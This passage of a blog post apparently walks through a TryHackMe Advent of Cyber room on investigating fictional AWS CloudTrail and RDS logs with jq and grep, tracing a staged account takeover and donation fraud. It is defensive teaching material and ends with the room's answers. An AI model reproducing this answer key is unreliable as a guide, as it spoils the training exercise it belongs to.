      <td><code class="language-plaintext highlighter-rouge">| [.eventTime, .eventName, .userIdentity.userName // "N/A",.requestParameters.bucketName // "N/A", .requestParameters.key // "N/A", .sourceIPAddress // "N/A"])'</code></td>
      <td>The piped filter uses the previous command’s output and formats it to only include the defined keys, such as <strong>.eventTime</strong>, <strong>.eventName</strong>, and <strong>.userIdentity.userName</strong>.The defined keys are enclosed with square brackets (<code class="language-plaintext highlighter-rouge">[]</code>)  <strong>to process and create an array with the specified fields from each record</strong>.Note that the string <code class="language-plaintext highlighter-rouge">// "N/A"</code> is included purely for formatting reasons. This means that if the defined key does not have a value, it will display <strong>N/A</strong> instead.</td>
    </tr>
  </tbody>
</table>

<p>As you can see in the results, we could focus on the notable items, but our initial goal is to render the output in a table to make it easy to digest. Let’s upgrade our command with additional parameters.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.requestParameters.bucketName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .requestParameters.key </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -</span><span class="err">t
</span></code></pre></div></div>

<p>You may observe that we have added the following items to our command:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"], SELECT_FILTER | SPECIFIC FIELDS'</code></td>
      <td>The new command prepends a column header row and is defined using square brackets since it is an array that corresponds to the selected fields.Note that a comma is used before the select filter to combine with those of the select filter results we previously used.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">| @tsv'</code></td>
      <td>Sets each array element, the output processed after the filters, as a line of tab-separated values.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">| column -t -s $'\t'</code></td>
      <td>It takes the output of the <strong>jq</strong> command, now resulting in tab-separated values, and beautifies its result by processing all tabs and aligning the columns.</td>
    </tr>
  </tbody>
</table>

<p><strong>Note:</strong> Our crafted command lets us summarise S3 activities from a CloudTrail log.</p>

<p>Now that we have crafted a JQ query that provides a well-refined output, let’s look at the results and observe the events. Based on the columns, we can answer the following questions to build our assumptions:</p>

<ul>
  <li>How many log entries are related to the <strong>wareville-care4wares</strong> bucket?</li>
  <li>Which user initiated most of these log entries?</li>
  <li>Which actions did the user perform based on the <strong>eventName</strong> field?</li>
  <li>Were there any specific files edited?</li>
  <li>What is the timestamp of the log entries?</li>
  <li>What is the source IP related to these log entries?</li>
</ul>

<p>Looking at the results, 5 logged events seem related to the <strong>wareville-care4wares</strong> bucket, and almost all are related to the user glitch. Aside from listing the objects inside the bucket (ListOBject event), the most notable detail is that the user glitch uploaded the file <strong>wareville-bank-account-qr.png</strong> on November 28th. This seems to coincide with the information we received about no donations being made 2 days after the link was sent out.</p>

<p>McSkidy is sure there was no user glitch in the system before. There is no one in the city hall with that name, either. The only person that McSkidy knows with that name is the hacker who keeps to himself. McSkidy suggests that we look into this anomalous user.</p>

<h2 id="mcskidy-fooled-us">McSkidy Fooled Us?</h2>

<p>McSkidy wants to know what this anomalous user account has been used for, when it was created, and who created it. Enter the command below to see all the events related to the anomalous user. We can focus our analysis on the following questions:</p>

<ul>
  <li>What event types are included in these log entries?</li>
  <li>What is the timestamp of these log entries?</li>
  <li>Which IPs are included in these log entries?</li>
  <li>What tool/OS was used in these log entries?</li>
</ul>

<p>ubuntu@tryhackme:~/wareville_logs \n</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.userIdentity.userName == "glitch"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>The results show that the user glitch mostly targeted the S3 bucket. The notable event is the <strong>ConsoleLogin</strong> entry, which tells us that the account was used to access the AWS Management Console using a browser.</p>

<p>We still need information about which tool and OS were used in the requests. Let’s view the <strong>userAgent</strong> value related to these events using the following command.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_type", "Event_Name", "User_Name", "Source_IP", "User_Agent"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.userIdentity.userName == "glitch"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime,.eventType, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr">"N</span><span class="se">/</span><span class="sr">A",.sourceIPAddress </span><span class="se">//</span><span class="sr">"N</span><span class="se">/</span><span class="sr">A", .userAgent </span><span class="se">//</span><span class="sr">"N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>There are two <strong>User-Agent</strong> values included in all log entries related to the <strong>glitch</strong> user:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard</code></td>
      <td>This is the userAgent string for the internal console used in AWS. It doesn’t provide much information.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</code></td>
      <td>This userAgent string provides us with 2 pieces of interesting information.The anomalous account uses a Google Chrome browser within a Mac OS system.</td>
    </tr>
  </tbody>
</table>

<p>An experienced attacker can forge these values, but we should not dismiss this information. It can be valuable when comparing different log entries for the same user. We will park the current information for now, let’s gather more information to connect the dots.</p>

<p>The next interesting event to look for is who created this anomalous user account. We will filter for all IAM-related events, and this can be done by using the select filter <code class="language-plaintext highlighter-rouge">.eventSource == "iam.amazonaws.com"</code>. Let’s execute the command below, and try to answer the following questions:</p>

<ul>
  <li>What Event Names are included in the log entries?</li>
  <li>What user executed these events?</li>
  <li>What is this user’s IP?</li>
</ul>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"</span><span class="se">]</span><span class="sr">, </span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "iam.amazonaws.com"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>Based on the results, there are many ListPolicies events. By ignoring these events, it seems that the most significant IAM activity is about the user <strong>mcskidy</strong> invoking the <strong>CreateUser</strong> action and consequently invoking the <strong>AttachUserPolicy</strong> action. The source IP where the requests were made is <strong>53.94.201.69</strong>. Remember that it is the same IP the anomalous user glitch used.</p>

<p>Let’s have a more detailed look at the event related to the <strong>CreateUser</strong> action by executing the command below:</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq '.Records</span><span class="se">[]</span><span class="sr"> |select</span><span class="se">(</span><span class="sr">.eventSource=="iam.amazonaws.com" and .eventName== "CreateUser"</span><span class="se">)</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>Based on the request parameters of the output, it can be seen that it was the user, <strong>mcskidy</strong>, who created the anomalous account.</p>

<p>Now, we need to know what permissions the anomalous user has. It could be devastating if it has access to our whole environment. We need to filter for the <strong>AttachUserPolicy</strong> event to uncover the permissions set for the newly created user. This event applies access policies to users, defining the extent of access to the account. Let’s filter for the specific event by executing the command below.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq '.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource=="iam.amazonaws.com" and .eventName== "AttachUserPolicy"</span><span class="se">)</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>McSkidy is baffled by these results. She knows that she did not create the anomalous user and did not assign the privileged access. She also doesn’t recognise the IP address involved in the events and does not use a Mac OS; she only uses a Windows machine. All this information is different to the typical IP address and machine used by McSkidy, so she wants to prove her innocence and asks to continue the investigation.</p>

<h2 id="logs-dont-lie">Logs Don’t Lie</h2>

<p>McSkidy suggests looking closely at the IP address and operating system related to all these anomalous events. Let’s use the following command below to continue with the investigation:</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"</span><span class="se">]</span><span class="sr">, </span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.sourceIPAddress=="53.94.201.69"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>Based on the command output, three user accounts (<strong>mcskidy</strong>, <strong>glitch</strong>, and <strong>mayor_malware</strong>) were accessed from the same IP address. The next step is to check each user and see if they always work from that IP.</p>

<p>Let’s focus on each user and see if they always work from that IP. Enter the command below, and replace the <code class="language-plaintext highlighter-rouge">PLACEHOLDER</code> with the username.</p>

<ul>
  <li>\</li>
</ul>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '</span><span class="se">[</span><span class="sr">"Event_Time","Event_Source","Event_Name", "User_Name","User_Agent","Source_IP"</span><span class="se">]</span><span class="sr">,</span><span class="se">(</span><span class="sr">.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.userIdentity.userName=="PLACEHOLDER"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventSource, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.userAgent </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">])</span><span class="sr"> | @tsv' cloudtrail_log.json | column -t -s $'</span><span class="se">\t</span><span class="err">'
</span></code></pre></div></div>

<p>While gathering the information for each user, we can focus our investigation on the following questions:</p>

<ul>
  <li>Which IP does each user typically use to log into AWS?</li>
  <li>Which OS and browser does each user usually use?</li>
  <li>Are there any similarities or explicit differences between the IP addresses and operating systems used?</li>
</ul>

<p>Based on the results, we have proven that McSkidy used a different IP address before the unusual authentication was discovered. Moreover, all evidence seems to point towards another user after correlating the IP address and User-Agent used by each user. Who do you think it could be? McSkidy has processed all the investigation results and summarized them below:</p>

<ul>
  <li>The incident starts with an anomalous login with the user account <strong>mcskidy</strong> from IP <strong>53.94.201.69</strong>.</li>
  <li>Shortly after the login, an anomalous user account <strong>glitch</strong> was created.</li>
  <li>Then, the <strong>glitch</strong> user account was assigned administrator permissions.</li>
  <li>The <strong>glitch</strong> user account then accessed the S3 bucket named <strong>wareville-care4wares</strong> and replaced the <strong>wareville-bank-account-qr.png</strong> file with a new one. The IP address and User-Agent used to log into the <strong>glitch, mcskidy</strong>, and <strong>mayor_malware</strong> accounts were the same.</li>
  <li>the User-Agent string and Source IP of recurrent logins by the user account <strong>mcskidy</strong> are different.</li>
</ul>

<h2 id="definite-evidence">Definite Evidence</h2>

<p>McSkidy suggests gathering stronger proof that that person was behind this incident. Luckily, Wareville Bank cooperated with us and provided their database logs from their Amazon Relational Database Service (RDS). They also mentioned that these are captured through their CloudWatch, which differs from the CloudTrail logs as they are not stored in JSON format. For now, let’s look at the bank transactions stored in the <code class="language-plaintext highlighter-rouge">~/wareville_logs/rds.log</code> file.</p>

<p>Since the log entries are different from the logs we previously investigated, McSkidy provided some guidance on how to analyse them. According to her, we can use the following command to show all the bank transactions.</p>

<p><strong>Note:</strong> Grep is a Unix command-line utility used for searching strings within a file or an input stream.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ grep INSERT rds.lo</span><span class="err">g
</span></code></pre></div></div>

<p>From the command above, McSkidy explained that all INSERT queries from the RDS log pertain to who received the donations made by the townspeople. Given this, we can see in the output the two recipients of all donations made within November 28th, 2024.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">17.728</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">17.728648</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">8839 2219 1329 6917</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Care4wares Fund</span><span class="dl">'</span><span class="p">,</span> <span class="mf">342.80</span><span class="p">)</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">18.569</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mf">18.569279</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">8839 2219 1329 6917</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Care4wares Fund</span><span class="dl">'</span><span class="p">,</span> <span class="mf">929.57</span><span class="p">)</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.605</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.605700</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">----- REDACTED ----</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Mayor Malware</span><span class="dl">'</span><span class="p">,</span> <span class="mf">193.45</span><span class="p">)</span>
<span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.792</span><span class="nx">Z</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">28</span><span class="nx">T15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mf">02.792161</span><span class="nx">Z</span>	  <span class="mi">263</span> <span class="nx">Query</span>	<span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nf">wareville_bank_transactions </span><span class="p">(</span><span class="nx">account_number</span><span class="p">,</span> <span class="nx">account_owner</span><span class="p">,</span> <span class="nx">amount</span><span class="p">)</span> <span class="nc">VALUES </span><span class="p">(</span><span class="dl">'</span><span class="s1">----- REDACTED ----</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Mayor Malware</span><span class="dl">'</span><span class="p">,</span> <span class="mf">998.13</span><span class="p">)</span>
<span class="o">---</span><span class="nx">REDACTED</span> <span class="nx">FOR</span> <span class="nx">BREVITY</span><span class="o">---</span>
</code></pre></div></div>

<p>As shown above, the Care4wares Fund received all the donations until it changed into a different account at a specific time. The logs also reveal who received the donations afterwards, given the account owner’s name. With all these findings, McSkidy confirmed the assumptions made during the investigation of the S3 bucket since the sudden change in bank details was reflected in the database logs. The timeline of events collected by McSkidy explains the connection of actions conducted by the culprit.</p>

<table>
  <thead>
    <tr>
      <th><strong>Timestamp</strong></th>
      <th><strong>Source</strong></th>
      <th><strong>Event</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2024-11-28 15:22:18</td>
      <td>CloudWatch RDS logs (rds.log)</td>
      <td>Last donation received by the Care4wares Fund.</td>
    </tr>
    <tr>
      <td>2024-11-28 15:22:39</td>
      <td>CloudTrail logs (cloudtrail_log.json)</td>
      <td>Bank details update on S3 bucket.</td>
    </tr>
    <tr>
      <td>2024-11-28 15:23:02</td>
      <td>CloudWatch RDS logs (rds.log)</td>
      <td>First donation received by Mayor Malware.</td>
    </tr>
  </tbody>
</table>

<h2 id="answer-the-questions-below">Answer the questions below</h2>

<p>What is the other activity made by the user glitch aside from the ListObject action?
PutObject</p>

<p>What is the source IP related to the S3 bucket activities of the user glitch?
53.94.201.69</p>

<p>Based on the eventSource field, what AWS service generates the ConsoleLogin event?
signin.amazonaws.com</p>

<p>When did the anomalous user trigger the ConsoleLogin event?
2024-11-28T15:21:54Z</p>

<p>What was the name of the user that was created by the mcskidy user?
glitch</p>

<p>What type of access was assigned to the anomalous user?
AdministratorAccess</p>

<p>Which IP does Mayor Malware typically use to log into AWS?
53.94.201.69</p>

<p>What is McSkidy’s actual IP address?
31.210.15.79</p>

<p>What is the bank account number owned by Mayor Malware?
2394 6912 7723 1294</p>

<p>Want to learn more about log analysis and how to interpret logs from different sources? Check out <a href="https://tryhackme.com/r/room/loguniverse">the Log Universe</a> room!</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day7Header.png" /><media:content medium="image" url="http://localhost:4000/Day7Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>